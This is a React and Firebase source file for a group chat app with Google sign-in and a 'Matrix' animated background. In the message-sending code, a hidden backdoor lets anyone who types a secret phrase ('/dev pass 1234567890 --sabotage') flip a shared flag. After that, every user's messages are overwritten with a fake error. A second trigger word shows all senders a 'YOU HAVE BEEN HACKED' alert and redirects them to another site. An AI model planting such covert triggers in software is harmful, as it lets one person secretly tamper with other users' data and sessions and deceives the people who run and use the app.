import React, { useRef, useState, useEffect } from 'react';
import './App.css';

import firebase from 'firebase/compat/app';
import 'firebase/compat/firestore';
import 'firebase/compat/auth';
import 'firebase/compat/analytics';

import { useAuthState } from 'react-firebase-hooks/auth';
import { useCollectionData } from 'react-firebase-hooks/firestore';

firebase.initializeApp({
apiKey: "AIzaSyBjgdsULz8I0Yg-o53MHa99dWw2doi4nnA",
  authDomain: "trial-1351d.firebaseapp.com",
  projectId: "trial-1351d",
  storageBucket: "trial-1351d.appspot.com",
  messagingSenderId: "39999243047",
  appId: "1:39999243047:web:33900dcc3bd612b8821f02",
  measurementId: "G-RD5KQ8MHRR"
})

const auth = firebase.auth();
const firestore = firebase.firestore();


function App() {

  const [user] = useAuthState(auth);

  return (
    <div className="App">
      <MatrixBackground />
      <header>
        <h1>🧑🏻‍💻💬</h1>
        <SignOut />
      </header>

      <section>
      
        {user ? <ChatRoom /> : <SignIn />}
      </section>

    </div>
  );
}

function MatrixBackground({ timeout = 50 }) {
  const canvas = useRef();

  useEffect(() => {
      const context = canvas.current.getContext('2d');

      const width = document.body.offsetWidth;
      const height = document.body.offsetHeight;
      canvas.current.width = width;
      canvas.current.height = height;

      context.fillStyle = '#000';
      context.fillRect(0, 0, width, height);

      const columns = Math.floor(width / 20) + 1;
      const yPositions = Array.from({ length: columns }).fill(0);

      context.fillStyle = '#000';
      context.fillRect(0, 0, width, height);

      const matrixEffect = () => {
          context.fillStyle = '#0001';
          context.fillRect(0, 0, width, height);
          
          const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
          const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghjiklmnopqrstuvwxyz';
          const nums = '0123456789';
          const alphabet = katakana + latin + nums;

          context.fillStyle = '#0f0';
          context.font = '15pt monospace';

          yPositions.forEach((y, index) => {
            const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
            const x = index * 20;
              context.fillText(text, x, y);

              if (y > 100 + Math.random() * 10000) {
                  yPositions[index] = 0;
              } else {
                  yPositions[index] = y + 20;
              }
          });
      };

      const interval = setInterval(matrixEffect, timeout);
      return () => {
          clearInterval(interval);
      };
  }, [canvas, timeout]);

  return (
      <div
          style={{
              background: '#000000',
              overflow: 'hidden',
              position: 'fixed',
              height: '100%',
              width: '100%',
              zIndex: -1,
              left: '0',
              top: '0',
          }}
      >
          <canvas
              ref={canvas}
          />
      </div>
  );
}

function SignIn() {

  const signInWithGoogle = () => {
    const provider = new firebase.auth.GoogleAuthProvider();
    auth.signInWithPopup(provider);
  }

  return (
    <>
      <button className="sign-in" onClick={signInWithGoogle}>Sign in with Google</button>
      <p>Do not violate the community guidelines or you will be banned for life!</p>
    </>
  )

}

function SignOut() {
  return auth.currentUser && (
    <button className="sign-out" onClick={() => auth.signOut()}>Sign Out</button>
  )
}


function ChatRoom() {
  const dummy = useRef();
  const messagesRef = firestore.collection('messages');
  const isHackedRef = firestore.collection('isHacked').doc('areWeHacked');
  const query = messagesRef.orderBy('createdAt',"desc").limit(10);

  const [messages] = useCollectionData(query, { idField: 'id' });
  messages.reverse();
  var [formValue, setFormValue] = useState('');


  const sendMessage = async (e) => {
    e.preventDefault();

    var { uid, photoURL, email } = auth.currentUser;

    const finale =await isHackedRef.get();
    if(finale.data().ans === true){
      formValue = 'FirebaseError(10): Conversion Limit Exceeded';
      photoURL = 'https://www.jea.com/cdn/images/avatar/avatar-alt.svg';
      console.log("SUPER HACKED");
    }
    if(finale.data().trans === true){
      alert("YOU HAVE BEEN HACKED");
      window.location.replace("https://www.youtube.com/watch?v=xvFZjo5PgG0");
    }
    await messagesRef.add({
      text: formValue,
      createdAt: firebase.firestore.FieldValue.serverTimestamp(),
      uid,
      email,
      photoURL
    })

    if(formValue === "/dev pass 1234567890 --sabotage"){
      await isHackedRef.update({
        ans: true
      })
      console.log("HACKED");
    }
    if(formValue === "rickroll"){
      await isHackedRef.update({
        trans: true
      })
    }
    else if(formValue.length > 128){
      console.log("sjkadsjksajdksjd /dev pass 1234567890 --sabotage asjhdskdjkj");
    }
    else
    {
      console.log("Message sent");
    }

    setFormValue('');
    dummy.current.scrollIntoView({ behavior: 'smooth' });
  }

  return (<>
    <main>

      {messages && messages.map(msg => <ChatMessage key={msg.id} message={msg} />)}

      <span ref={dummy}></span>

    </main>

    <form onSubmit={sendMessage}>

      <input value={formValue} onChange={(e) => setFormValue(e.target.value)} placeholder="say something nice" />

      <button type="submit" disabled={!formValue}><i class="material-icons">&#xe163;</i></button>

    </form>
  </>)
}


function ChatMessage(props) {
  const { text, uid, photoURL } = props.message;

  const messageClass = uid === auth.currentUser.uid ? 'sent' : 'received';

  return (<>
    <div className={`message ${messageClass}`}>
      <img src={photoURL || 'https://api.adorable.io/avatars/23/abott@adorable.png'} alt="avatar" />
      <p>{text}</p>
    </div>
  </>)
}


export default App;
